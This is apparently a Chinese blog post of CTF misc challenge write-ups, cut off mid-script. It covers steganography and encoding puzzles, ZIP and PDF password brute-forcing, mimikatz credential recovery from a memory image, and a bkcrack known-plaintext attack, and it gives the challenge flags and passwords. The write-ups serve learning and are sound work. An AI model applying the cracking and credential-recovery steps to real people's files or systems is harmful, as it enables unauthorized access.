<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-coffee_loving_cat%e5%a4%a9%e6%9d%83%e4%bf%a1%e5%ae%89ctf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>整场比赛Misc的完整wp：<a href=https://blog.csdn.net/weixin_52365980/article/details/128338404 target=_blank rel="external nofollow noopener noreferrer">首届“天权信安&amp;catf1ag”网络安全联合公开赛-部分misc-CSDN博客</a></p><p>附件给了一个压缩包，里面一共有四个文件，其中三个文件是加密的</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225205715776.png alt=/posts/bb1da35/imgs/image-20241225205715776.png height=1010 width=2284></p><p>但是下面这张文件没有加密，猜测需要从下面这张图片中获取解压密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225205550609.jpeg alt=/posts/bb1da35/imgs/image-20241225205550609.jpeg height=1702 width=1276></p><p>发现这张图片主要是讲咖啡价格的，因此密码与咖啡有关，上网搜索可以找到下面这篇文章</p><p>星巴克杯子上字母的含义：https://www.mopress.io/food/olejRNQWej</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. L - 一般拿铁（Latte）
</span></span><span class=line><span class=cl>2. VL - 香草拿铁（Vanilla Latte）
</span></span><span class=line><span class=cl>3. HL - 榛子拿铁（Hazelnut Latte）
</span></span><span class=line><span class=cl>4. FW - 馥芮白（Flat white）
</span></span><span class=line><span class=cl>5. CM - 焦糖玛奇朵（Caramel Macchiato）
</span></span><span class=line><span class=cl>6. M - 摩卡（Mocha）
</span></span><span class=line><span class=cl>7. C加横杠 - 卡布奇诺（Cappuccino）
</span></span><span class=line><span class=cl>8. A - 美式咖啡（Americano）</span></span></code></pre></td></tr></table></div></div><p>根据这个对应关系和上面那张图可以得到：<code>ALCMCMFW</code></p><p>然后把上面咖啡的价格以此相加<code>6+9+12+10+14+11 = 62</code>联想到base62编码</p><p>之前得到的内容base62编码一下可以得到解压密码<code>5bZuRXL0Mjf</code></p><p>解压后可以得到两张图片，里面有两张二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225212423398.png alt=/posts/bb1da35/imgs/image-20241225212423398.png height=1152 width=1152></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225212429255.png alt=/posts/bb1da35/imgs/image-20241225212429255.png height=1152 width=1152></p><p>扫码后可以得到如下内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Megrez is yyds!!!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Megrez is my god!!!</span></span></code></pre></td></tr></table></div></div><p>然后我们看另一张图片，结合题目名称中的cat，猜测是Arnold猫脸变换</p><p>因为shuffle_times、a、b三个参数都未知，因此我们尝试爆破一下</p><p>最后发现正确的shuffle_times、a、b分别为 12、0、9</p><blockquote><p>Tips：这里因为图片不是正方形，所以需要分别取模宽和高</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>arnold_decode</span><span class=p>(</span><span class=n>image</span><span class=p>,</span> <span class=n>shuffle_times</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>decode_image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>(</span><span class=n>shape</span><span class=o>=</span><span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>image</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>time</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>shuffle_times</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>ori_x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>ori_y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>new_x</span> <span class=o>=</span> <span class=p>((</span><span class=n>a</span> <span class=o>*</span> <span class=n>b</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_x</span> <span class=o>+</span> <span class=p>(</span><span class=o>-</span><span class=n>b</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_y</span><span class=p>)</span> <span class=o>%</span> <span class=n>h</span>
</span></span><span class=line><span class=cl>                <span class=n>new_y</span> <span class=o>=</span> <span class=p>((</span><span class=o>-</span><span class=n>a</span><span class=p>)</span> <span class=o>*</span> <span class=n>ori_x</span> <span class=o>+</span> <span class=n>ori_y</span><span class=p>)</span> <span class=o>%</span> <span class=n>w</span>
</span></span><span class=line><span class=cl>                <span class=n>decode_image</span><span class=p>[</span><span class=n>new_x</span><span class=p>,</span> <span class=n>new_y</span><span class=p>,</span> <span class=p>:]</span> <span class=o>=</span> <span class=n>image</span><span class=p>[</span><span class=n>ori_x</span><span class=p>,</span> <span class=n>ori_y</span><span class=p>,</span> <span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>image</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>copy</span><span class=p>(</span><span class=n>decode_image</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>imread</span><span class=p>(</span><span class=s2>&#34;fla@.bmp&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decode_img</span> <span class=o>=</span> <span class=n>arnold_decode</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cv2</span><span class=o>.</span><span class=n>imwrite</span><span class=p>(</span><span class=s1>&#39;flag.png&#39;</span><span class=p>,</span><span class=n>decode_img</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本后即可得到flag：<code>flag{512ed05a-629a-11ed-ae9d-ac1203fb3249}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225215512617.png alt=/posts/bb1da35/imgs/image-20241225215512617.png height=673 width=1152></p><h2 class=heading-element id=题目名称-简单的图片xsctf联合招新赛><span>题目名称 简单的图片(XSCTF联合招新赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e7%ae%80%e5%8d%95%e7%9a%84%e5%9b%be%e7%89%87xsctf%e8%81%94%e5%90%88%e6%8b%9b%e6%96%b0%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了下面这张图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225220056396.png alt=/posts/bb1da35/imgs/image-20241225220056396.png height=356 width=640></p><p>zsteg扫一下，发现LSB隐写了数据</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225220153184.png alt=/posts/bb1da35/imgs/image-20241225220153184.png height=984 width=1300></p><p>尝试用<code>zsteg -e b1,bgr,lsb,xy IM.png > data.txt</code>导出可以得到如下数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[&#39;xxfxc&#39;, &#39;xxfst&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxfft&#39;, &#39;xxttc&#39;, &#39;xxffs&#39;, &#39;xxsft&#39;, &#39;xxftc&#39;, &#39;xxtfx&#39;, &#39;xxtfc&#39;, &#39;xxfcf&#39;, &#39;xxfxs&#39;, &#39;xxtfx&#39;, &#39;xxctx&#39;, &#39;xxfcx&#39;, &#39;xxtfx&#39;, &#39;xxsff&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxcxs&#39;, &#39;xxtfx&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxftx&#39;, &#39;xxfts&#39;, &#39;xxfxs&#39;, &#39;xxfcf&#39;, &#39;xxsfc&#39;, &#39;xsxxx&#39;]</span></span></code></pre></td></tr></table></div></div><p>仔细观察上面的数据，发现都是x开头的，然后每个字符串的长度都是5，并且字符集就是<code>xsctf</code>这五个字符</p><p>因此猜测是五进制，结合最后一个字符<code>xsxxx</code>对应<code>01000(125)</code>刚刚好是<code>{</code>，更加确定是五进制了</p><p>因此我们写一个脚本转换一下即可得到flag：<code>flag{\y0u_are_An_1mag3_master/}</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>lst</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;xxfxc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfst&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfxt&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfft&#39;</span><span class=p>,</span> <span class=s1>&#39;xxttc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxffs&#39;</span><span class=p>,</span> <span class=s1>&#39;xxsft&#39;</span><span class=p>,</span> <span class=s1>&#39;xxftc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfcf&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfxs&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxctx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfcx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxsff&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfsf&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfxt&#39;</span><span class=p>,</span> <span class=s1>&#39;xxcxs&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfsf&#39;</span><span class=p>,</span> <span class=s1>&#39;xxtfc&#39;</span><span class=p>,</span> <span class=s1>&#39;xxftx&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfts&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfxs&#39;</span><span class=p>,</span> <span class=s1>&#39;xxfcf&#39;</span><span class=p>,</span> <span class=s1>&#39;xxsfc&#39;</span><span class=p>,</span> <span class=s1>&#39;xsxxx&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>trans</span> <span class=o>=</span> <span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=s2>&#34;xsctf&#34;</span><span class=p>,</span><span class=s2>&#34;01234&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>lst</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>item</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=n>trans</span><span class=p>),</span><span class=mi>5</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># flag{\y0u_are_An_1mag3_master/}</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-mos><span>题目名称 mos</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-mos class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一个zip压缩包，尝试解压发现报错</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229105407188.png alt=/posts/bb1da35/imgs/image-20241229105407188.png height=722 width=840></p><p>用010打开，发现是文件头损坏了，因此我们修复一下PK文件头<code>504B0304</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229105440827.png alt=/posts/bb1da35/imgs/image-20241229105440827.png height=1528 width=2560></p><p>然后解压发现需要密码，因此我们尝试使用弱密码字典爆破，爆破得到解压密码：<code>1234</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229105601835.png alt=/posts/bb1da35/imgs/image-20241229105601835.png height=685 width=698></p><p>然后解压得到一个TXT文件，vscode打开发现全是换行符和TAB</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229105847149.png alt=/posts/bb1da35/imgs/image-20241229105847149.png height=1528 width=2560></p><p>上面没有发现什么信息，然后尝试了Snow和WhiteSpace也没有发现什么，因此尝试用010打开</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229110123007.png alt=/posts/bb1da35/imgs/image-20241229110123007.png height=1528 width=2560></p><p>发现只有<code>0D0A</code>和<code>09</code>这两种字符，因此很容易就能联想到要转换为二进制</p><p>直接CyberChef转换一下即可得到flag：<code>DASCTF{dmF1Swofv__hpDYa52y6g4eGJEt_KX}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229110612714.png alt=/posts/bb1da35/imgs/image-20241229110612714.png height=1528 width=2560></p><h2 class=heading-element id=题目名称-misc-1><span>题目名称 Misc-1</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-misc-1 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一张PNG图片，010打开发现有报错，拉到最后面发现图片末尾藏了一个PDF文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229131712409.png alt=/posts/bb1da35/imgs/image-20241229131712409.png height=1528 width=2560></p><p>手动把PDF文件提取出来，打开发现需要密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229131730152.png alt=/posts/bb1da35/imgs/image-20241229131730152.png height=1470 width=2559></p><p>直接使用<code>pdfcrack</code>弱密码字典爆破一下即可得到密码：<code>qazwsx123</code>，打开即可得到flag：<code>flag{Misc_iS_S0eAsy!}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229131736993.png alt=/posts/bb1da35/imgs/image-20241229131736993.png height=450 width=1734></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229131756212.png alt=/posts/bb1da35/imgs/image-20241229131756212.png height=495 width=2558></p><h2 class=heading-element id=题目名称-654321><span>题目名称 654321</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-654321 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一张PNG图片，010打开发现报错，发现图片末尾藏了一个RAR压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229151425356.png alt=/posts/bb1da35/imgs/image-20241229151425356.png height=1327 width=1968></p><p>手动提取出来并解压，得到一个<code>hint.docx</code>，里面的内容如下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229151527679.png alt=/posts/bb1da35/imgs/image-20241229151527679.png height=1077 width=1532></p><p>提示了<code>Image steganography</code>这个工具，然后结合图片名字<code>654321</code>，猜测这个就是解密的密码</p><p>因此使用<code>Image steganography</code>解密即可得到flag：<code>zjctf{060cdc53440dde37f2d48c33da37113b4d95a458}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229151648420.png alt=/posts/bb1da35/imgs/image-20241229151648420.png height=723 width=557></p><h2 class=heading-element id=题目名称-丢失的关键基础设施固件><span>题目名称 丢失的关键基础设施固件</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e4%b8%a2%e5%a4%b1%e7%9a%84%e5%85%b3%e9%94%ae%e5%9f%ba%e7%a1%80%e8%ae%be%e6%96%bd%e5%9b%ba%e4%bb%b6 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题面信息如下：</p><blockquote><p>丢失的关键基础设施固件</p><p>尝试从内存镜像中找回丢失的固件，并从固件中找到关键信息</p></blockquote><p>附件给了一个<code>memdump.raw</code>内存镜像，直接R-stdio打开先粗略的看一遍</p><p>发现在Develop用户的桌面上有个<code>secret.zip</code>和两个压缩和解压的exe</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229110931697.png alt=/posts/bb1da35/imgs/image-20241229110931697.png height=1528 width=2560></p><p>因此尝试用vol2把桌面上这几个文件提取出来（但是好像zip.exe是提取不出来的）</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229111842695.png alt=/posts/bb1da35/imgs/image-20241229111842695.png height=1528 width=2560></p><p>提取出来后发现需要解压密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229112038934.png alt=/posts/bb1da35/imgs/image-20241229112038934.png height=865 width=1723></p><p>我们使用<code>mimikatz</code>插件可以爆破出<code>develop</code>用户的密码：<code>!Qaz@Wsx</code>，但是不是压缩包的解压密码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229112325533.png alt=/posts/bb1da35/imgs/image-20241229112325533.png height=271 width=1734></p><p>然后在<code>iehistory</code>中可以知道丢失的固件名称为<code>红绿灯固件.txt</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229120047938.png alt=/posts/bb1da35/imgs/image-20241229120047938.png height=1528 width=2560></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241229120112436.png alt=/posts/bb1da35/imgs/image-20241229120112436.png height=1484 width=2559></p><p>回头仔细看那个压缩包，发现是Store+Zipcrypto，因此可以用PNG的文件头进行明文攻击</p><p>用bkcrack明文攻击后即可得到最后的flag</p><h2 class=heading-element id=题目名称-qrsacode><span>题目名称 QRSACode</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-qrsacode class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题面信息如下</p><blockquote><p>描述：p = 13,q = 19,e = ?</p></blockquote><p>解压附件给的压缩包，可以得到如下两张图片，其中<code>task.png</code>中隐约可以看到一张二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818213344866.png alt=/posts/bb1da35/imgs/image-20250818213344866.png height=198 width=366></p><p>然后结合题面的信息，我们知道在RSA中<code>e</code>要和<code>phi</code>互质，其中<code>phi=(q-1)*(p-1)</code></p><p>因此我们可以写个脚本得到<code>e</code>所有可能的取值范围</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cal_e</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=mi>13</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=mi>19</span>
</span></span><span class=line><span class=cl>    <span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=p>[</span><span class=n>e</span> <span class=k>for</span> <span class=n>e</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>256</span><span class=p>)</span> <span class=k>if</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>gcd</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(res)) # 84</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(res)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span></span></span></code></pre></td></tr></table></div></div><p>得到<code>e</code>所有可能的取值如下，一共84种可能取值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[5, 7, 11, 13, 17, 19, 23, 25, 29, 31, 35, 37, 41, 43, 47, 49, 53, 55, 59, 61, 65, 67, 71, 73, 77, 79, 83, 85, 89, 91, 95, 97, 101, 103, 107, 109, 113, 115, 119, 121, 125, 127, 131, 133, 137, 139, 143, 145, 149, 151, 155, 157, 161, 163, 167, 169, 173, 175, 179, 181, 185, 187, 191, 193, 197, 199, 203, 205, 209, 211, 215, 217, 221, 223, 227, 229, 233, 235, 239, 241, 245, 247, 251, 253]</span></span></code></pre></td></tr></table></div></div><p>然后我们尝试去读取<code>hint.png</code>中的像素点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
